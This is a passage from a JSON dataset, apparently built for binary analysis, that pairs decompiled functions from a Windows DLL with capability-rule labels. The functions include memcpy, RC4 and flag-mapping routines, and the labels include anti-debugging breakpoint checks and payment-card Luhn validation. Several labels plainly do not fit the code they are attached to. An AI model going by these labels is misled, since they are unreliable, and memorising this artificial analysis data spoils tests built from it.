0x10;\n        uVar2 = uVar1 | 8;\n        if ((arg1_00 & 0x200) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = uVar2 | 4;\n        if ((arg1_00 & 0x400) == 0) {\n            uVar1 = uVar2;\n        }\n        uVar2 = uVar1 | 2;\n        if ((arg1_00 & 0x800) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = uVar2 | 1;\n        if ((arg1_00 & 0x1000) == 0) {\n            uVar1 = uVar2;\n        }\n        uVar2 = uVar1 | 0x80000;\n        if ((arg1_00 & 0x100) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = arg1_00 & 0x6000;\n        if ((arg1_00 & 0x6000) != 0) {\n            if (uVar1 == 0x2000) {\n                uVar2 = uVar2 | 0x100;\n            }\n            else if (uVar1 == 0x4000) {\n                uVar2 = uVar2 | 0x200;\n            }\n            else if (uVar1 == 0x6000) {\n                uVar2 = uVar2 | 0x300;\n            }\n        }\n        uVar1 = arg1_00 & 0x8040;\n        if (uVar1 == 0x40) {\n            uVar2 = uVar2 | 0x2000000;\n        }\n        else if (uVar1 == 0x8000) {\n            uVar2 = uVar2 | 0x3000000;\n        }\n        else if (uVar1 == 0x8040) {\n            uVar2 = uVar2 | 0x1000000;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1607
    },
    "18000d37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuchar (*) [32] fcn.18000d370(uchar (*arg1) [32], uchar (*arg2) [32], uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uchar (*pauVar15) [32];\n    uchar (*pauVar16) [32];\n    uchar (*pauVar17) [32];\n    uint *puVar18;\n    uint *puVar19;\n    uchar (*pauVar20) [32];\n    uint *puVar21;\n    uint64_t uVar22;\n    int64_t iVar23;\n    uint64_t uVar24;\n    uint uVar25;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uchar auVar26 [32];\n    uchar auVar30 [32];\n    uchar auVar31 [32];\n    uchar auVar32 [32];\n    uchar auVar33 [32];\n    uchar auVar34 [32];\n    \n    pauVar15 = arg1;\n    if (arg3 < 0x10) {\n    // switch table (16 cases) at 0x18002f050\n        switch(*(arg3 * 4 + 0x18002f050) + 0x180000000) {\n        case 0x18000d39e:\n            return pauVar15;\n        case 0x18000d3a0:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            uVar2 = (*arg2)[0xe];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            (*arg1)[0xe] = uVar2;\n            return pauVar15;\n        case 0x18000d3c0:\n            uVar3 = *(*arg2 + 8);\n            uVar2 = (*arg2)[10];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar2;\n            return pauVar15;\n        case 0x18000d3d8:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x18000d3e0:\n            uVar3 = *(*arg2 + 4);\n            uVar2 = (*arg2)[6];\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            (*arg1)[6] = uVar2;\n            return pauVar15;\n        case 0x18000d3f8:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            return pauVar15;\n        case 0x18000d40f:\n            uVar2 = (*arg2)[2];\n            **arg1 = **arg2;\n            (*arg1)[2] = uVar2;\n            return pauVar15;\n        case 0x18000d420:\n            uVar4 = *(*arg2 + 8);\n            uVar2 = (*arg2)[0xc];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            (*arg1)[0xc] = uVar2;\n            return pauVar15;\n        case 0x18000d436:\n            uVar3 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            return pauVar15;\n        case 0x18000d445:\n            uVar2 = (*arg2)[8];\n            **arg1 = **arg2;\n            (*arg1)[8] = uVar2;\n            return pauVar15;\n        case 0x18000d453:\n            uVar4 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            return pauVar15;\n        case 0x18000d460:\n            uVar3 = *(*arg2 + 4);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            return pauVar15;\n        case 0x18000d46f:\n            uVar2 = (*arg2)[4];\n            **arg1 = **arg2;\n            (*arg1)[4] = uVar2;\n            return pauVar15;\n        case 0x18000d47d:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x18000d484:\n            (*arg1)[0] = (*arg2)[0];\n            return pauVar15;\n        case 0x18000d48a:\n            **arg1 = **arg2;\n            return pauVar15;\n        }\n    }\n    if (arg3 < 0x21) {\n        uVar4 = *(*arg2 + 4);\n        uVar5 = *(*arg2 + 8);\n        uVar6 = *(*arg2 + 0xc);\n        puVar18 = arg2[-1] + arg3 + 0x10;\n        uVar25 = *puVar18;\n        uVar27 = puVar18[1];\n        uVar28 = puVar18[2];\n        uVar29 = puVar18[3];\n        **arg1 = **arg2;\n        *(*arg1 + 4) = uVar4;\n        *(*arg1 + 8) = uVar5;\n        *(*arg1 + 0xc) = uVar6;\n        puVar18 = arg1[-1] + arg3 + 0x10;\n        *puVar18 = uVar25;\n        puVar18[1] = uVar27;\n        puVar18[2] = uVar28;\n        puVar18[3] = uVar29;\n        return pauVar15;\n    }\n    if ((arg2 < arg1) && (arg1 < *arg2 + arg3)) {\n        iVar23 = arg2 - arg1;\n        puVar18 = arg1 + iVar23 + (arg3 - 0x10);\n        uVar4 = puVar18[1];\n        uVar5 = puVar18[2];\n        uVar6 = puVar18[3];\n        puVar19 = arg1[-1] + arg3 + 0x10;\n        uVar22 = arg3 - 0x10;\n        puVar21 = puVar19;\n        uVar25 = *puVar18;\n        uVar27 = uVar4;\n        uVar28 = uVar5;\n        uVar29 = uVar6;\n        if ((puVar19 & 0xf) != 0) {\n            puVar21 = puVar19 & 0xfffffffffffffff0;\n            puVar1 = puVar21 + iVar23;\n            uVar25 = *puVar1;\n            uVar27 = puVar1[1];\n            uVar28 = puVar1[2];\n            uVar29 = puVar1[3];\n            *puVar19 = *puVar18;\n            *(arg1[-1] + arg3 + 0x14) = uVar4;\n            *(arg1[-1] + arg3 + 0x18) = uVar5;\n            *(arg1[-1] + arg3 + 0x1c) = uVar6;\n            uVar22 = puVar21 - arg1;\n        }\n        uVar24 = uVar22 >> 7;\n        if (uVar24 != 0) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar18 = puVar21;\n            while( true ) {\n                puVar19 = puVar18 + iVar23 + -0x10;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar21 = puVar18 + iVar23 + -0x20;\n                uVar25 = *puVar21;\n                uVar27 = puVar21[1];\n                uVar28 = puVar21[2];\n                uVar29 = puVar21[3];\n                puVar21 = puVar18 + -0x20;\n                puVar18[-4] = *puVar19;\n                puVar18[-3] = uVar4;\n                puVar18[-2] = uVar5;\n                puVar18[-1] = uVar6;\n                puVar18[-8] = uVar25;\n                puVar18[-7] = uVar27;\n                puVar18[-6] = uVar28;\n                puVar18[-5] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x30;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x40;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                uVar24 = uVar24 - 1;\n                puVar18[-0xc] = *puVar19;\n                puVar18[-0xb] = uVar4;\n                puVar18[-10] = uVar5;\n                puVar18[-9] = uVar6;\n                puVar18[-0x10] = uVar25;\n                puVar18[-0xf] = uVar27;\n                puVar18[-0xe] = uVar28;\n                puVar18[-0xd] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x50;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x60;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                puVar18[-0x14] = *puVar19;\n                puVar18[-0x13] = uVar4;\n                puVar18[-0x12] = uVar5;\n                puVar18[-0x11] = uVar6;\n                puVar18[-0x18] = uVar25;\n                puVar18[-0x17] = uVar27;\n                puVar18[-0x16] = uVar28;\n                puVar18[-0x15] = uVar29;\n                puVar1 = puVar18 + iVar23 + -0x70;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                puVar19 = puVar21 + iVar23;\n                uVar25 = *puVar19;\n                uVar27 = puVar19[1];\n                uVar28 = puVar19[2];\n                uVar29 = puVar19[3];\n                if (uVar24 == 0) break;\n                puVar18[-0x1c] = *puVar1;\n                puVar18[-0x1b] = uVar4;\n                puVar18[-0x1a] = uVar5;\n                puVar18[-0x19] = uVar6;\n                *puVar21 = uVar25;\n                puVar18[-0x1f] = uVar27;\n                puVar18[-0x1e] = uVar28;\n                puVar18[-0x1d] = uVar29;\n                puVar18 = puVar21;\n            }\n            puVar18[-0x1c] = *puVar1;\n            puVar18[-0x1b] = uVar4;\n            puVar18[-0x1a] = uVar5;\n            puVar18[-0x19] = uVar6;\n            uVar22 = uVar22 & 0x7f;\n        }\n        for (uVar24 = uVar22 >> 4; uVar24 != 0; uVar24 = uVar24 - 1) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar21 = puVar21 + -4;\n            puVar18 = puVar21 + iVar23;\n            uVar25 = *puVar18;\n            uVar27 = puVar18[1];\n            uVar28 = puVar18[2];\n            uVar29 = puVar18[3];\n        }\n        if ((uVar22 & 0xf) != 0) {\n            uVar4 = *(*arg2 + 4);\n            uVar5 = *(*arg2 + 8);\n            uVar6 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar4;\n            *(*arg1 + 8) = uVar5;\n            *(*arg1 + 0xc) = uVar6;\n        }\n        *puVar21 = uVar25;\n        puVar21[1] = uVar27;\n        puVar21[2] = uVar28;\n        puVar21[3] = uVar29;\n        return arg1;\n    }\n    if (*0x18002b008 < 3) {\n        if ((arg3 < 0x801) || ((*0x18002bb7c & 2) == 0)) {\n            if (0x80 < arg3) {\n                iVar23 = (arg1 & 0xf) - 0x10;\n                puVar18 = arg1 - iVar23;\n                puVar21 = arg2 - iVar23;\n                arg3 = arg3 + iVar23;\n                if (0x80 < arg3) {\n                    do {\n                        uVar4 = puVar21[1];\n                        uVar5 = puVar21[2];\n                        uVar6 = puVar21[3];\n                        uVar25 = puVar21[4];\n                        uVar27 = puVar21[5];\n                        uVar28 = puVar21[6];\n                        uVar29 = puVar21[7];\n                        uVar7 = puVar21[8];\n                        uVar8 = puVar21[9];\n                        uVar9 = puVar21[10];\n                        uVar10 = puVar21[0xb];\n                        uVar11 = puVar21[0xc];\n                        uVar12 = puVar21[0xd];\n                        uVar13 = puVar21[0xe];\n                        uVar14 = puVar21[0xf];\n                        *puVar18 = *puVar21;\n                        puVar18[1] = uVar4;\n                        puVar18[2] = uVar5;\n                        puVar18[3] = uVar6;\n                        puVar18[4] = uVar25;\n                        puVar18[5] = uVar27;\n                        puVar18[6] = uVar28;\n                        puVar18[7] = uVar29;\n                        puVar18[8] = uVar7;\n                        puVar18[9] = uVar8;\n                        puVar18[10] = uVar9;\n                        puVar18[0xb] = uVar10;\n                        puVar18[0xc] = uVar11;\n                        puVar18[0xd] = uVar12;\n                        puVar18[0xe] = uVar13;\n                        puVar18[0xf] = uVar14;\n                        uVar4 = puVar21[0x11];\n                        uVar5 = puVar21[0x12];\n                        uVar6 = puVar21[0x13];\n                        uVar25 = puVar21[0x14];\n                        uVar27 = puVar21[0x15];\n                        uVar28 = puVar21[0x16];\n                        uVar29 = puVar21[0x17];\n                        uVar7 = puVar21[0x18];\n                        uVar8 = puVar21[0x19];\n                        uVar9 = puVar21[0x1a];\n                        uVar10 = puVar21[0x1b];\n                        uVar11 = puVar21[0x1c];\n                        uVar12 = puVar21[0x1d];\n                        uVar13 = puVar21[0x1e];\n                        uVar14 = puVar21[0x1f];\n                        puVar18[0x10] = puVar21[0x10];\n                        puVar18[0x11] = uVar4;\n                        puVar18[0x12] = uVar5;\n                        puVar18[0x13] = uVar6;\n                        puVar18[0x14] = uVar25;\n                        puVar18[0x15] = uVar27;\n                        puVar18[0x16] = uVar28;\n                        puVar18[0x17] = uVar29;\n                        puVar18[0x18] = uVar7;\n                        puVar18[0x19] = uVar8;\n                        puVar18[0x1a] = uVar9;\n                        puVar18[0x1b] = uVar10;\n                        puVar18[0x1c] = uVar11;\n                        puVar18[0x1d] = uVar12;\n                        puVar18[0x1e] = uVar13;\n                        puVar18[0x1f] = uVar14;\n                        puVar18 = puVar18 + 0x20;\n                        puVar21 = puVar21 + 0x20;\n                        arg3 = arg3 - 0x80;\n                    } while (0x7f < arg3);\n                }\n            }\n    // WARNING: Could not recover jumptable at 0x00018000d886. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (9 cases) at 0x18002f0d8\n            pauVar15 = (*(*((arg3 + 0xf >> 4) * 4 + 0x18002f0d8) + 0x180000000))();\n            return pauVar15;\n        }\n    }\n    else if (((arg3 < 0x2001) || (0x180000 < arg3)) || ((*0x18002bb7c & 2) == 0)) {\n        auVar26 = vmovdqu_avx(*arg2);\n        auVar34 = vmovdqu_avx(*(arg2[-1] + arg3));\n        if (0x100 < arg3) {\n            iVar23 = (arg1 & 0x1f) - 0x20;\n            pauVar16 = arg1 - iVar23;\n            arg2 = arg2 - iVar23;\n            arg3 = arg3 + iVar23;\n            if (0x100 < arg3) {\n                if (0x180000 < arg3) {\n                    do {\n                        uVar22 = arg3;\n                        pauVar20 = arg2;\n                        pauVar17 = pauVar16;\n                        auVar30 = vmovdqu_avx(*pauVar20);\n                        auVar31 = vmovdqu_avx(pauVar20[1]);\n                        auVar32 = vmovdqu_avx(pauVar20[2]);\n                        auVar33 = vmovdqu_avx(pauVar20[3]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *pauVar17 = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[1] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[2] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[3] = auVar30;\n                        auVar30 = vmovdqu_avx(pauVar20[4]);\n                        auVar31 = vmovdqu_avx(pauVar20[5]);\n                        auVar32 = vmovdqu_avx(pauVar20[6]);\n                        auVar33 = vmovdqu_avx(pauVar20[7]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        pauVar17[4] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[5] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[6] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[7] = auVar30;\n                        pauVar16 = pauVar17[8];\n                        arg2 = pauVar20[8];\n                        arg3 = uVar22 - 0x100;\n                    } while (0xff < uVar22 - 0x100);\n                    uVar24 = uVar22 - 0xe1 & 0xffffffffffffffe0;\n    // switch table (18 cases) at 0x18002f0b4\n                    switch(uVar22) {\n                    case 0x1e1:\n                    case 0x1e2:\n                    case 0x1e3:\n                    case 0x1e4:\n                    case 0x1e5:\n                    case 0x1e6:\n                    case 0x1e7:\n                    case 0x1e8:\n                    case 0x1e9:\n                    case 0x1ea:\n                    case 0x1eb:\n                    case 0x1ec:\n                    case 0x1ed:\n                    case 0x1ee:\n                    case 0x1ef:\n                    case 0x1f0:\n                    case 0x1f1:\n                    case 0x1f2:\n                    case 499:\n                    case 500:\n                    case 0x1f5:\n                    case 0x1f6:\n                    case 0x1f7:\n                    case 0x1f8:\n                    case 0x1f9:\n                    case 0x1fa:\n                    case 0x1fb:\n                    case 0x1fc:\n                    case 0x1fd:\n                    case 0x1fe:\n                    case 0x1ff:\n                        auVar30 = vmovdqu_avx(*(*pauVar20 + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(*pauVar17 + uVar24) = auVar30;\n                    case 0x1c1:\n                    case 0x1c2:\n                    case 0x1c3:\n                    case 0x1c4:\n                    case 0x1c5:\n                    case 0x1c6:\n                    case 0x1c7:\n                    case 0x1c8:\n                    case 0x1c9:\n                    case 0x1ca:\n                    case 0x1cb:\n                    case 0x1cc:\n                    case 0x1cd:\n                    case 0x1ce:\n                    case 0x1cf:\n                    case 0x1d0:\n                    case 0x1d1:\n                    case 0x1d2:\n                    case 0x1d3:\n                    case 0x1d4:\n                    case 0x1d5:\n                    case 0x1d6:\n                    case 0x1d7:\n                    case 0x1d8:\n                    case 0x1d9:\n                    case 0x1da:\n                    case 0x1db:\n                    case 0x1dc:\n                    case 0x1dd:\n                    case 0x1de:\n                    case 0x1df:\n                    case 0x1e0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[1] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[1] + uVar24) = auVar30;\n                    case 0x1a1:\n                    case 0x1a2:\n                    case 0x1a3:\n                    case 0x1a4:\n                    case 0x1a5:\n                    case 0x1a6:\n                    case 0x1a7:\n                    case 0x1a8:\n                    case 0x1a9:\n                    case 0x1aa:\n                    case 0x1ab:\n                    case 0x1ac:\n                    case 0x1ad:\n                    case 0x1ae:\n                    case 0x1af:\n                    case 0x1b0:\n                    case 0x1b1:\n                    case 0x1b2:\n                    case 0x1b3:\n                    case 0x1b4:\n                    case 0x1b5:\n                    case 0x1b6:\n                    case 0x1b7:\n                    case 0x1b8:\n                    case 0x1b9:\n                    case 0x1ba:\n                    case 0x1bb:\n                    case 0x1bc:\n                    case 0x1bd:\n                    case 0x1be:\n                    case 0x1bf:\n                    case 0x1c0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[2] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[2] + uVar24) = auVar30;\n                    case 0x181:\n                    case 0x182:\n                    case 0x183:\n                    case 0x184:\n                    case 0x185:\n                    case 0x186:\n                    case 0x187:\n                    case 0x188:\n                    case 0x189:\n                    case 0x18a:\n                    case 0x18b:\n                    case 0x18c:\n                    case 0x18d:\n                    case 0x18e:\n                    case 399:\n                    case 400:\n                    case 0x191:\n                    case 0x192:\n                    case 0x193:\n                    case 0x194:\n                    case 0x195:\n                    case 0x196:\n                    case 0x197:\n                    case 0x198:\n                    case 0x199:\n                    case 0x19a:\n                    case 0x19b:\n                    case 0x19c:\n                    case 0x19d:\n                    case 0x19e:\n                    case 0x19f:\n                    case 0x1a0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[3] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[3] + uVar24) = auVar30;\n                    case 0x161:\n                    case 0x162:\n                    case 0x163:\n                    case 0x164:\n                    case 0x165:\n                    case 0x166:\n                    case 0x167:\n                    case 0x168:\n                    case 0x169:\n                    case 0x16a:\n                    case 0x16b:\n                    case 0x16c:\n                    case 0x16d:\n                    case 0x16e:\n                    case 0x16f:\n                    case 0x170:\n                    case 0x171:\n                    case 0x172:\n                    case 0x173:\n                    case 0x174:\n                    case 0x175:\n                    case 0x176:\n                    case 0x177:\n                    case 0x178:\n                    case 0x179:\n                    case 0x17a:\n                    case 0x17b:\n                    case 0x17c:\n                    case 0x17d:\n                    case 0x17e:\n                    case 0x17f:\n                    case 0x180:\n                        auVar30 = vmovdqu_avx(*(pauVar20[4] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[4] + uVar24) = auVar30;\n                    case 0x141:\n                    case 0x142:\n                    case 0x143:\n                    case 0x144:\n                    case 0x145:\n                    case 0x146:\n                    case 0x147:\n                    case 0x148:\n                    case 0x149:\n                    case 0x14a:\n                    case 0x14b:\n                    case 0x14c:\n                    case 0x14d:\n                    case 0x14e:\n                    case 0x14f:\n                    case 0x150:\n                    case 0x151:\n                    case 0x152:\n                    case 0x153:\n                    case 0x154:\n                    case 0x155:\n                    case 0x156:\n                    case 0x157:\n                    case 0x158:\n                    case 0x159:\n                    case 0x15a:\n                    case 0x15b:\n                    case 0x15c:\n                    case 0x15d:\n                    case 0x15e:\n                    case 0x15f:\n                    case 0x160:\n                        auVar30 = vmovdqu_avx(*(pauVar20[5] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[5] + uVar24) = auVar30;\n                    case 0x121:\n                    case 0x122:\n                    case 0x123:\n                    case 0x124:\n                    case 0x125:\n                    case 0x126:\n                    case 0x127:\n                    case 0x128:\n                    case 0x129:\n                    case 0x12a:\n                    case 299:\n                    case 300:\n                    case 0x12d:\n                    case 0x12e:\n                    case 0x12f:\n                    case 0x130:\n                    case 0x131:\n                    case 0x132:\n                    case 0x133:\n                    case 0x134:\n                    case 0x135:\n                    case 0x136:\n                    case 0x137:\n                    case 0x138:\n                    case 0x139:\n                    case 0x13a:\n                    case 0x13b:\n                    case 0x13c:\n                    case 0x13d:\n                    case 0x13e:\n                    case 0x13f:\n                    case 0x140:\n                        auVar30 = vmovdqu_avx(*(pauVar20[6] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[6] + uVar24) = auVar30;\n                    default:\n                        auVar34 = vmovdqu_avx(auVar34);\n                        *(pauVar17[-1] + uVar22) = auVar34;\n                    case 0x100:\n                        auVar26 = vmovdqu_avx(auVar26);\n                        *arg1 = auVar26;\n                        vzeroupper_avx();\n                        return pauVar15;\n                    }\n                }\n                do {\n                    auVar34 = vmovdqu_avx(*arg2);\n                    auVar30 = vmovdqu_avx(arg2[1]);\n                    auVar31 = vmovdqu_avx(arg2[2]);\n                    auVar32 = vmovdqu_avx(arg2[3]);\n                    *pauVar16 = auVar34;\n                    pauVar16[1] = auVar30;\n                    pauVar16[2] = auVar31;\n                    pauVar16[3] = auVar32;\n                    auVar34 = vmovdqu_avx(arg2[4]);\n                    auVar30 = vmovdqu_avx(arg2[5]);\n                    auVar31 = vmovdqu_avx(arg2[6]);\n                    auVar32 = vmovdqu_avx(arg2[7]);\n                    pauVar16[4] = auVar34;\n                    pauVar16[5] = auVar30;\n                    pauVar16[6] = auVar31;\n                    pauVar16[7] = auVar32;\n                    pauVar16 = pauVar16[8];\n                    arg2 = arg2[8];\n                    arg3 = arg3 - 0x100;\n                } while (0xff < arg3);\n            }\n        }\n    // WARNING: Could not recover jumptable at 0x00018000d5e2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (27 cases) at 0x18002f090\n        pauVar15 = (*(*((arg3 + 0x1f >> 5) * 4 + 0x18002f090) + 0x180000000))(SUB328(auVar26, 0));\n        return pauVar15;\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        (*arg1)[0] = (*arg2)[0];\n        arg2 = *arg2 + 1;\n        arg1 = *arg1 + 1;\n    }\n    return pauVar15;\n}\n",
        "token_count": 7551
    },
    "1800040c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/97fd46272f2f4646aeb4203fef93a0f6",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/fbb3cad0774d4241aca00aa22762cd66"
        ],
        "decompiled_code": "\nint64_t fcn.1800040c0(int64_t arg1)\n\n{\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uStack20 = 0xc6;\n    uStack24 = 0;\n    while( true ) {\n        if (*0x18002ce80 < uStack24) {\n            return 0;\n        }\n        if ((*(uStack24 * 0xc + 0x18002ce9c) <= arg1) &&\n           ((arg1 < *((uStack24 + 1) * 0xc + 0x18002ce9c) || (uStack24 == *0x18002ce80 - 1)))) break;\n        uStack20 = uStack20 + *(uStack24 * 0xc + 0x18002ce98);\n        uStack24 = uStack24 + 1;\n    }\n    return (arg1 - *(uStack24 * 0xc + 0x18002ce9c)) + uStack20;\n}\n",
        "token_count": 224
    },
    "180003c0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180003c00(int64_t arg1, int64_t arg2, int32_t *arg3)\n\n{\n    uchar uVar1;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    for (iStack24 = 0; iStack24 < 0x100; iStack24 = iStack24 + 1) {\n        *(arg1 + iStack24) = iStack24;\n    }\n    uStack20 = 0;\n    for (iStack24 = 0; iStack24 < 0x100; iStack24 = iStack24 + 1) {\n        uStack20 = uStack20 + *(arg1 + iStack24) + *(arg2 + iStack24 % *arg3) & 0xff;\n        uVar1 = *(arg1 + iStack24);\n        *(arg1 + iStack24) = *(arg1 + uStack20);\n        *(arg1 + uStack20) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "180003d0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.180003d00(int64_t arg1, int64_t arg2, int32_t *arg3, int64_t arg4)\n\n{\n    uchar uVar1;\n    uint32_t uStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    \n    uStack40 = 0;\n    uStack32 = 0;\n    for (iStack36 = 0; iStack36 < *arg3; iStack36 = iStack36 + 1) {\n        uStack40 = uStack40 + 1 & 0xff;\n        uStack32 = uStack32 + *(arg1 + uStack40) & 0xff;\n        uVar1 = *(arg1 + uStack40);\n        *(arg1 + uStack40) = *(arg1 + uStack32);\n        *(arg1 + uStack32) = uVar1;\n        *(arg4 + iStack36) = *(arg2 + iStack36) ^ *(arg1 + (*(arg1 + uStack40) + *(arg1 + uStack32) & 0xff));\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "180006be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180006be0(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    uchar auStack24 [16];\n    \n    iVar1 = fcn.1800074f0(arg2);\n    if (arg1 != iVar1) {\n        puVar2 = auStack24;\n        for (iVar1 = 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        fcn.180007070(arg1, arg2);\n    }\n    return arg1;\n}\n",
        "token_count": 148
    },
    "18000735": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180007350(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    uint8_t *puVar2;\n    uchar uStack24;\n    uint8_t auStack23 [7];\n    int64_t iStack16;\n    \n    if (*(arg1 + 0x18) < arg3) {\n        puVar2 = auStack23;\n        for (iVar1 = 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        arg1 = fcn.180007c40(arg1, arg3, auStack23[0], arg2);\n    }\n    else {\n        iStack16 = fcn.180007470(arg1);\n        *(arg1 + 0x10) = arg3;\n        fcn.180007790(iStack16, arg2, arg3);\n        uStack24 = 0;\n        fcn.180007770(iStack16 + arg3, &uStack24);\n    }\n    return arg1;\n}\n",
        "token_count": 252
    },
    "180009a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180009a1c(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.18000a2e4(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::length_error.0;\n    return arg1;\n}\n",
        "token_count": 119
    },
    "18001728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
